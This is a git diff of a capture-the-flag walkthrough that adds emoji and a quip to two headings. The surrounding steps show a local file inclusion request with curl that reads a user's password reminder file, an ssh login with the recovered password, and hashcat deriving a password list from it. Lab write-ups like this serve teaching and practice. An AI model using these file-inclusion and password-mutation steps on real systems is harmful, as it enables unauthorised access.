@@ -102,11 +102,11 @@ curl http://target-ip/index.php?page=file:///home/blue/.reminder
 sup3r_p@s$w0rd!
 ```
 Step 4:
-###### Lets ssh into blue using that password since its in user blue's directory
+###### Lets ssh into blue using that password since its in user blue's directory. We are blue team after all 🤨
 ```
 ssh blue@target-ip
 ```
-###### Yes! We got in... Urh not for long. The password does not work anymore :(<br>Maybe thats why hashcat created a password list from the one we found.<br>Lets find out
+###### Yes!😲 We got in... Urh not for long. The password does not work anymore :(<br>Maybe thats why hashcat created a password list from the one we found.<br>Lets find out
 ```
 hashcat --stdout .reminder -r /usr/share/hashcat/rules/best64.rule > passlist.txt
 ```
